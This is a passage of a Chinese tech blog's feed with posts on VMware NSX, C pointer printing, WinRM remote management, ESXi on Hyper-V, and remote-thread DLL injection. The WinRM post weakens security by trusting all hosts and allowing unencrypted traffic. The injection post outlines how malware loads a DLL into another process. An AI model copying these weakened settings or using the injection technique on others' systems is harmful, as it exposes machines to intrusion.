        <content type="html"><![CDATA[<h1 id="sdn实践虚拟化集群下一代安全网关-nsx">SDN实践：虚拟化集群下一代安全网关-NSX</h1><h2 id="环境">环境</h2><ul><li>VMware vSphere vCenter 6.7</li><li>VMware NSX (NSX-T Data Center) 4.0</li></ul><h2 id="更换-https-ssl-证书">更换 HTTPS SSL 证书</h2><p>NSX 将很多操作都迁移到了 API 调用上。</p><pre class="line-numbers language-none"><code class="language-none">POST https://&lt;nsx-mgr&gt;/api/v1/node/services/http?action=apply_certificate&amp;certificate_id=e61c7537-3090-4149-b2b6-19915c20504f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来更换，如果提示 403 访问拒绝的话。</p><p>需要在 Header 中添加凭据</p><pre class="line-numbers language-none"><code class="language-none">Authorization: Basic &lt;"user:password" Base64后的结果&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后添加到客户机根证书就行了，冲冲冲。</p><h2 id="无法联网">无法联网</h2><p>一开始无法连接自己的 VCSA 实例，非常奇怪。</p><p>紧接着发现 ping 公网不通。</p><p>直接发现是路由表的问题。</p><p><code>set route prefix 0.0.0.0/0 gateway &lt;GW&gt; interface eth0 metric 0</code></p><p>一秒解决</p><h2 id="寄">寄</h2><p>不支持 vCenter &lt; 7.0（我的是 6.7）</p><p>全剧终。</p><h2 id="参考">参考</h2><ul><li><a href="https://docs.vmware.com/cn/VMware-NSX-T-Data-Center/3.2/administration/GUID-50C36862-A29D-48FA-8CE7-697E64E10E37.html">替换证书</a></li><li><a href="https://communities.vmware.com/t5/VMware-NSX-Discussions/A-Valid-Xsrf-Token-header-must-be-provided-with-the-Http-Request/td-p/2212627">API调用</a></li><li><a href="https://kb.vmware.com/s/article/2150736?lang=zh_CN">为 NSXCLI 创建一个用户并分配 API 角色/权限</a></li><li><a href="https://blogs.vmware.com/vmware-taiwan/2018/07/25/%E7%B6%B2%E8%B7%AF%E8%99%9B%E6%93%AC%E5%8C%96nsx-%E6%8A%80%E8%A1%93%E6%96%87%E7%AB%A0%E7%B3%BB%E5%88%97%E4%BA%94%E5%8D%81%E4%BA%94%EF%BC%9A%E5%AF%AB%E7%B5%A6it%E7%AE%A1%E7%90%86%E5%93%A1%E7%9C%8B/">API调用 101</a></li><li><a href="https://www.infvie.com/ops-notes/virtualization/nsx-t-3-0-vds-vsphere-7-with-kubernetes-tanzu.html">vSphere7 (NSX-T 3.0 VDS) with kubernetes&amp;Tanzu cluster</a></li><li><a href="https://github.com/vmware-nsx/eval-docs/blob/master/docs/2-Installation.md">Installationof NSX-T</a></li><li><a href="https://blog.csdn.net/techgroup/article/details/103401995">Comparision</a></li><li><a href="https://blogs.vmware.com/china/2017/11/07/nsx-%E7%AE%80%E4%BB%8B-%E7%BD%91%E7%BB%9C%E8%99%9A%E6%8B%9F%E5%8C%96/">NSX简介 — 网络虚拟化</a></li><li><a href="https://www.weithenn.org/2015/01/Study-VMware-NSX-Part01.html">VMwareNSX 筆記</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工程 </tag>
            
            <tag> VMware </tag>
            
            <tag> SDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++ 中指针地址输出</title>
      <link href="/2022/10/17/c-c-zhong-zhi-zhen-di-zhi-shu-chu/"/>
      <url>/2022/10/17/c-c-zhong-zhi-zhen-di-zhi-shu-chu/</url>
      
        <content type="html"><![CDATA[<p>姿势很多</p><h2 id="section"></h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>cout<span class="token punctuation">;</span><span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pszStr <span class="token operator">=</span> <span class="token string">"this is a string"</span><span class="token punctuation">;</span>    <span class="token comment">// 输出字符串</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"字符串："</span> <span class="token operator">&lt;&lt;</span> pszStr <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">// 显然不会输出地址值</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"字符串起始地址值： "</span> <span class="token operator">&lt;&lt;</span> pszStr <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pszStr <span class="token operator">=</span> <span class="token string">"this is a string"</span><span class="token punctuation">;</span>    <span class="token comment">// 输出字符串\    printf("字符串：%s\n", pszStr);</span>    <span class="token comment">// 输出地址值</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"字符串起始地址值：%p\n"</span><span class="token punctuation">,</span> pszStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>C++标准库中I/O类对<code>&lt;&lt;</code>操作符重载，因此在遇到字符型指针时会将其当作字符串名来处理，输出指针所指的字符串。既然这样，那么我们就别让它知道那是字符型指针，所以得用到强制类型转换，不过不是C的那套，我们得用<code>static_cast</code>来实现，把字符串指针转换成无类型指针，这样更规范，如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>cout<span class="token punctuation">;</span><span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pszStr <span class="token operator">=</span> <span class="token string">"this is a string"</span><span class="token punctuation">;</span>     <span class="token comment">// 输出字符串</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"字符串："</span> <span class="token operator">&lt;&lt;</span> pszStr <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token comment">// 如我们所愿，输出地址值</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"字符串起始地址值： "</span> <span class="token operator">&lt;&lt;</span> <span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pszStr<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用-zu">使用 %zu</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Printing p: %%p = %p, %%zu = %zu\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="pre-defined">Pre-defined</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Convert to the uintptr_t type defined in <span class="token operator">&lt;</span>stdint<span class="token punctuation">.</span>h<span class="token operator">&gt;</span> <span class="token operator">and</span> format with the PRIuPTR specifier defined in <span class="token operator">&lt;</span>inttypes<span class="token punctuation">.</span>h<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%"</span> PRIuPTR <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cast the pointer to uintmax_t (defined in &lt;stdint.h&gt;), andprint the cast result with %ju:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Printing p: %%p = %p, %%ju = %ju\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token punctuation">(</span>uintmax_t<span class="token punctuation">)</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Note that there is no guarantee that <code>uintmax_t</code> is wideenough to hold a pointer, but it's probably OK. (If it's not OK for yourplatform, the compiler might complain.) You could use<code>uintptr_t</code>, as suggested elsewhere, but in the case that<code>uintmax_t</code> isn't wide enough, <code>uintptr_t</code> won'texist at all.</p><h2 id="指向结构体的指针">指向结构体的指针</h2><p><a href="https://stackoverflow.com/questions/15519855/address-of-c-pointer-to-class-data-member-in-visual-studio">StackOverflow</a></p><h2 id="参考">参考</h2><ul><li><a href="https://www.jianshu.com/p/1259795b6df8">https://www.jianshu.com/p/1259795b6df8</a></li><li><a href="https://stackoverflow.com/questions/65756913/c-how-to-print-address-as-a-decimal-value-not-hex-without-compiler-warnings">https://stackoverflow.com/questions/65756913/c-how-to-print-address-as-a-decimal-value-not-hex-without-compiler-warnings</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 WinRM 服务和 Windows Admin Ceter 实现远程控制</title>
      <link href="/2022/10/16/shi-yong-winrm-fu-wu-he-windows-admin-ceter-shi-xian-yuan-cheng-kong-zhi/"/>
      <url>/2022/10/16/shi-yong-winrm-fu-wu-he-windows-admin-ceter-shi-xian-yuan-cheng-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="使用-winrm-服务和-windows-admin-ceter-实现远程控制">使用 WinRM服务和 Windows Admin Ceter 实现远程控制</h1><h2 id="intro">Intro</h2><p>近日在探索 Windows Server 平台上类似于 VMware vSphere ESXi / WebClient 的解决方案。</p><p>了解到 Windows Admin Center 可以靠 AAD 或者 Windows凭据登录服务器上的 Host OS进行管理，偶然发现在经过配置后甚至可以对自己未加入 Azure ActiveDirectory 的笔记本进行管理，狂喜！</p><p>上效果图：</p><p><img src="https://googles.plus/images/loading.gif" data-original="images/wac_winrm.png"></p><h2 id="windows-admin-center-侧需要准备的">Windows Admin Center侧需要准备的</h2><ol type="1"><li>安装 WAC</li><li>WAC &gt; 设置 &gt; 扩展中安装自己想要的扩展，这里我额外安装了 SDN组件和性能监控</li><li>查看服务情况、监听和防火墙/路由规则，确保连接通畅</li></ol><h2 id="被控-windows-侧需要准备的">被控 Windows 侧需要准备的</h2><ol type="1"><li>开启 WinRM 服务</li></ol><blockquote><p>参见：<a href="https://learn.microsoft.com/zh-cn/windows-server/manage/windows-admin-center/support/troubleshooting#are-you-connecting-to-a-workgroup-machine-on-a-different-subnet">排查Windows Admin Center 问题</a></p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-NetFirewallRule</span> <span class="token operator">-</span>Name WINRM-HTTP-In-TCP <span class="token operator">-</span>RemoteAddress Any<span class="token function">Set-Item</span> WSMan:\localhost\Client\TrustedHosts <span class="token operator">-</span>Value <span class="token string">'*'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>这里强烈建议只开放连接给自己的WAC服务器IP（NoWildcard）</strong></p><ol start="2" type="1"><li>查看账户类型</li></ol><p>Windows 10+ 下，账户类型主要为 Microsoft Single-Sign On (SSO)账户或本地账户，要区分很简单，MSSSO 账户会有域名地址，类似于邮件。</p><p>填写对应的用户名和密码即可，WAC 控制端和被控端都不需要加入 AAD.</p><ol start="3" type="1"><li>Enjoy!</li></ol><h2 id="开放服务">开放服务</h2><h3 id="受控端配置">受控端配置</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 查看状态，如无返回信息，则是没有启动</span>winrm enumerate winrm/config/listener<span class="token comment"># 对 WinRM Service 进行基础配置</span>winrm quickconfig<span class="token comment">#为 WinRM Service 配置加密方式为允许非加密</span>winrm <span class="token function">set</span> winrm/config/service ‘@<span class="token punctuation">{</span>AllowUnencrypted=<span class="token string">"true"</span><span class="token punctuation">}</span>’<span class="token function">Set-NetFirewallRule</span> <span class="token operator">-</span>Name <span class="token string">"WINRM-HTTP-In-TCP-PUBLIC"</span> <span class="token operator">-</span>RemoteAddress Any<span class="token comment"># 也可以在 PowerShell 使用命令开启 WinRM</span><span class="token function">Enable-PSRemoting</span> <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="控制端配置">控制端配置</h3><p>这里有一个比较烧脑的概念，即使是控制端主动连接别人，也需要对IP授权。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-Item</span> WSMan:localhost\client\trustedhosts <span class="token operator">-</span>value &lt;IP&gt; <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="refer">Refer</h2><ul><li>https://blog.csdn.net/leejeff/article/details/82907773</li><li>https://blog.51cto.com/wuyvzhang/1719409</li><li>https://www.se7ensec.cn/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</li><li>https://www.freebuf.com/articles/system/259632.html</li><li>https://www.wangan.com/p/7fygfg3e497a3528#%E4%BD%BF%E7%94%A8Metasploit%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 虚拟化 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESXi on Hyper-V 嵌套虚拟化游记</title>
      <link href="/2022/10/10/esxi-on-hyper-v-qian-tao-xu-ni-hua-you-ji/"/>
      <url>/2022/10/10/esxi-on-hyper-v-qian-tao-xu-ni-hua-you-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware-vsphere-esxi-on-hyper-v-嵌套虚拟化游记">VMware vSphereESXi on Hyper-V 嵌套虚拟化游记</h1><h2 id="知识梳理">知识梳理</h2><blockquote><p><a href="https://zhuanlan.zhihu.com/p/381969738">梳理一下 Windows 的Hyper-V、Hypervisor</a></p></blockquote><h2 id="microsoft-hyper-v-限制">Microsoft Hyper-V 限制</h2><h3 id="安装向导">安装向导</h3><ul><li>虚拟机代数需选择 <strong>Generation 1</strong></li><li>网络驱动器只能存在传统驱动器</li></ul><h3 id="虚拟化通告">虚拟化通告</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-VMProcessor</span> <span class="token operator">-</span>VMName <span class="token string">"&lt;Hyper-V 虚拟机名称&gt;"</span> <span class="token operator">-</span>ExposeVirtualizationExtensions <span class="token boolean">$true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="cpu-核数">CPU 核数</h3><p>ESXi 安装时，要求 CPU 核数 &gt; 2，所以需要转到 Hyper-V管理器中：</p><ol type="1"><li>在处理器处添加不少于 2 个虚拟处理器<strong>（但此时相当于两个核，并不是两个能被 ESXi 识别的 CPU）</strong></li><li>转到 NUMA 选单中，将NUMA拓扑中最大处理器数量改为上一步 vCPU数量的一半</li><li>检查内存大小以及单宿主机 CPU 插槽上最大 NUMA 节点数</li></ol><h3 id="无法安装-hyper-v">无法安装 Hyper-V</h3><p>无法安装 Hyper-V: 虚拟机监控程序已在运行中。</p><p>在配置文件末尾附加：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">hypervisor.cpuid.v0</span> <span class="token punctuation">=</span> <span class="token value attr-value">“FALSE”</span><span class="token key attr-name">mce.enable</span> <span class="token punctuation">=</span> <span class="token value attr-value">“TRUE”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="vmware-vsphere-esxi-限制">VMware vSphere ESXi 限制</h2><h3 id="驱动封锁">驱动封锁</h3><p>官方在 <code>ESXi-6.0.0-20170604001</code>之后的版本中封锁了这种方法，基于 Hyper-V 的嵌套虚拟化暂时不再可行。</p><blockquote><p>另一说是 ESXi 6.5（</p></blockquote><p>EoL 版本的下载地址藏得比较深，在专门的一个分类里。</p><h3 id="无法识别虚拟网卡">无法识别虚拟网卡</h3><p>现象为安装时提示无网络，只能重启。</p><p>需要先安装 ESXi-Customizer-PS 后，自己对 Offline Bundle 格式的 ESXi安装包集成网络适配器驱动，脚本会自动导出 ISO 文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">ESXi-Customizer-<span class="token function">PS</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>iZip <span class="token string">"path\to\esxi\installer\in\zip\ESXi600-201706001.zip"</span> <span class="token operator">-</span>pkgDir <span class="token string">"path\to\dir\contains\tulip"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我采用离线安装，如果需要在线安装 <code>net-tulip</code>驱动包的话，需要把 <code>-pkgDir ...</code> 替换为<code>-vft -load net-tulip</code> 参数。</p><h3 id="启动失败">启动失败</h3><p>在进入引导后按 <kbd>Tab</kbd>，附加启动参数<code>ignoreHeadless=TRUE</code>.</p><h3 id="内核参数-bypass">内核参数 bypass</h3><p>在系统安装成功之后，在 Shell 或 SSH 中执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost:~<span class="token punctuation">]</span> esxcfg-advcfg <span class="token parameter variable">-k</span> TRUE ignoreHeadless<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后，先 <kbd>F12</kbd> 关机，再次开启 vSphere ESXi 即可。</p><p><strong>注意：在我的环境中，这一步按 F12后如果重启是无法写入内核参数，导致命令看似无效。</strong></p><h2 id="共存解决方案windows-hypervisor-platform">共存解决方案：WindowsHypervisor Platform</h2><blockquote><p><a href="https://blog.csdn.net/oldfish__/article/details/88641864">开启Windows Hypervisor Platform</a></p></blockquote><h2 id="虚拟机无法联网">虚拟机无法联网</h2><p>由于整个 ESXi Hypervisor 都要通过 Hyper-V 的 vNIC与外界联网，所以需要做一个 MAC 地址欺骗。</p><p>注意在网上找到的英文教程中，会提示要在 ESXi vSwitch中开启混杂模式，这样做恰恰相反了。教程中是在 ESXi 中嵌套了 WindowsServer 所自带的 Hyper-V，这时需要为 ESXi 的虚拟交换机开启混杂模式。</p><p>而我们的宿主机和客户机的 Hypervisor 是反过来的，所以需要为 WindowsServer 中 Hyper-V 的 vNIC 开启混杂模式。</p><h3 id="步骤">步骤</h3><ol type="1"><li>Hyper-V 虚拟交换机需<strong>关闭</strong> SR-IOV多VM增强模式（直通）支持</li><li>开启 MAC地址欺骗：<code>Get-VMNetworkAdapter -VMName &lt;VMName&gt; | Set-VMNetworkAdapter -MacAddressSpoofing On</code></li></ol><h2 id="hyper-v-官方脚本">Hyper-V 官方脚本</h2><blockquote><p><a href="https://timothygruber.com/hyper-v-2/run-a-nested-vm-on-kvm-qemu-vm-in-hyper-v/">RUNA NESTED VM ON KVM / QEMU VM IN HYPER-V</a> <a href="https://learn.microsoft.com/zh-cn/virtualization/">Microsoft虚拟化文档</a> <a href="https://github.com/MicrosoftDocs/Virtualization-Documentation/blob/main/hyperv-tools/Nested/Enable-NestedVm.ps1">https://github.com/MicrosoftDocs/Virtualization-Documentation/blob/main/hyperv-tools/Nested/Enable-NestedVm.ps1</a></p></blockquote><h2 id="hyper-v-vnic-开启混杂模式">Hyper-V vNIC 开启混杂模式</h2><blockquote><p><a href="https://cloudbase.it/hyper-v-promiscuous-mode/">Hyper-Vpromiscuous mode for monitoring external traffic</a></p></blockquote><h4 id="nat可选">NAT（可选）</h4><p>首先在宿主虚拟机（中间VM）中创建一个虚拟 NAT 交换机。注意 IP地址只是一个示例，会因环境而异。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">New-VMSwitch</span> <span class="token operator">-</span>Name VmNAT <span class="token operator">-</span>SwitchType Internal<span class="token function">New-NetNat</span> –Name LocalNAT –InternalIPInterfaceAddressPrefix “192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>100<span class="token punctuation">.</span>0/24”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后为 vNIC 分配一个 IP 地址： </p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-NetAdapter</span> <span class="token string">"vEthernet (VmNat)"</span> <span class="token punctuation">|</span> <span class="token function">New-NetIPAddress</span> <span class="token operator">-</span>IPAddress 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>100<span class="token punctuation">.</span>1 <span class="token operator">-</span>AddressFamily IPv4 <span class="token operator">-</span>PrefixLength 24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><p>每个嵌套的虚拟机都必须有一个分配给它的 IP地址和缺省网关。请注意，网关 IP 必须指向上一步中的 NAT适配器。可能还需要分配 DNS 服务器：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-NetAdapter</span> <span class="token string">"vEthernet (VmNat)"</span> <span class="token punctuation">|</span> <span class="token function">New-NetIPAddress</span> <span class="token operator">-</span>IPAddress 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>100<span class="token punctuation">.</span>2 <span class="token operator">-</span>DefaultGateway 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>100<span class="token punctuation">.</span>1 <span class="token operator">-</span>AddressFamily IPv4 <span class="token operator">-</span>PrefixLength 24Netsh interface ip add dnsserver “vEthernet <span class="token punctuation">(</span>VmNat<span class="token punctuation">)</span>” address=&lt;my DNS server&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="vm-无法启动">VM 无法启动</h2><p>需要在 VM 配置中或 vSphere Client 高级设置 中添加<code>vmx.allowNested = TRUE</code> 以允许嵌套虚拟化。</p><p>但这是无法再为客户机 VM 开启虚拟化通告了（无法多层嵌套虚拟化）。</p><h2 id="有用的链接">有用的链接</h2><ul><li><a href="https://www.dinghui.org/vmware-iso-download.html">VMware常用软件ISO下载汇总</a></li><li><a href="https://blog.molipre.com/posts/d4a7aac.html">为PC安装ESXI</a></li></ul><h2 id="参考">参考</h2><ul><li><a href="https://dscottraynsford.wordpress.com/2016/04/22/install-a-vmware-esxi-6-0-hypervisor-in-a-hyper-v-vm/">https://dscottraynsford.wordpress.com/2016/04/22/install-a-vmware-esxi-6-0-hypervisor-in-a-hyper-v-vm/</a></li><li><a href="https://www.nakivo.com/blog/install-esxi-hyper-v/">InstallESXi on Hyper-V</a></li><li><a href="http://woshub.com/install-vmware-esxi-on-hyper-v-vm/">http://woshub.com/install-vmware-esxi-on-hyper-v-vm/</a></li><li><a href="http://realtechtalk.com/Relocating_modules_and_starting_up_the_kernel_VMWare_ESXi_67_Error_and_Solution-2032-articles">http://realtechtalk.com/Relocating_modules_and_starting_up_the_kernel_VMWare_ESXi_67_Error_and_Solution-2032-articles</a></li><li><a href="https://blog.myvirtualvision.com/2013/04/03/vmware-vsphere-nested/">驱动整合</a></li><li><a href="https://communities.vmware.com/t5/Nested-Virtualization/VMware-ESXi-5-1-can-run-Microsoft-Hyper-V-Server-2012-VMs-too/m-p/424504?start=0&amp;tstart=0">https://communities.vmware.com/t5/Nested-Virtualization/VMware-ESXi-5-1-can-run-Microsoft-Hyper-V-Server-2012-VMs-too/m-p/424504?start=0&amp;tstart=0</a></li><li><a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/user-guide/nested-virtualization">https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/user-guide/nested-virtualization</a></li><li><a href="https://communities.vmware.com/t5/ESXi-Discussions/Running-VMs-in-VMware-ESXi-VM-on-Hpyer-V/td-p/1752644">https://communities.vmware.com/t5/ESXi-Discussions/Running-VMs-in-VMware-ESXi-VM-on-Hpyer-V/td-p/1752644</a></li><li><a href="https://communities.vmware.com/t5/Nested-Virtualization/Running-ESX-under-KVM-with-VM-x-EPT/td-p/2668850">https://communities.vmware.com/t5/Nested-Virtualization/Running-ESX-under-KVM-with-VM-x-EPT/td-p/2668850</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> VMware </tag>
            
            <tag> Hyper-V </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程线程DLL注入</title>
      <link href="/2022/10/05/yuan-cheng-xian-cheng-dll-zhu-ru/"/>
      <url>/2022/10/05/yuan-cheng-xian-cheng-dll-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="远程线程-dll-注入">远程线程 DLL 注入</h1><h2 id="plain-method">Plain Method</h2><p>在一次软件逆向中，使用detours的注入功能：<code>setdll /d:E:\VS_DEBUG\DetoursDll\Debug\DetoursDll.dll D:\infoflow\infoflow.exe</code></p><p>原理其实就是把dll给注入到exe的节表里了，运行失败，估计对exe有校验。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2WjldbPrnpPgwpWicSswsrrMwYqW8EEEgFd24M2rfKOBtKYzdWfLek6FMpkcLFb5TAfibhF2Zxxdw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p><h2 id="remote-injection">Remote Injection</h2><p>远程线程注入dll，成功。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F2WjldbPrnpPgwpWicSswsrX3vQVQAiamQXibicanQ5kHbuO8VZ3RAstR4o6iayyG1n6JMXZMr08a1G8A/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p><h2 id="分析">分析</h2><p>在远程线程DLL注入技术中，目标（远程）进程被迫通过<code>LoadLibrary()</code> API将<strong>恶意DLL</strong>加载到其进程内存空间中。kernel32.dll 引入了<code>LoadLibrary()</code> 函数，只接受一个参数——<strong>DLL的路径</strong>，并将该 DLL 加载到调用进程的地址空间中。</p><p>在这种注入技术中，恶意软件进程在目标进程中创建一个线程，并通过<code>LoadLibrary()</code>把DLL路径作为参数来传递，进而调用该线程。由于线程是在目标进程中创建的，因此目标进程会将恶意DLL加载到其地址空间中。一旦目标进程加载恶意DLL，操作系统就会自动调用了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建 ntop 流量捕捉/记录/分析环境</title>
      <link href="/2022/10/04/gou-jian-ntop-liu-liang-bu-zhuo-ji-lu-fen-xi-huan-jing/"/>
      <url>/2022/10/04/gou-jian-ntop-liu-liang-bu-zhuo-ji-lu-fen-xi-huan-jing/</url>
      
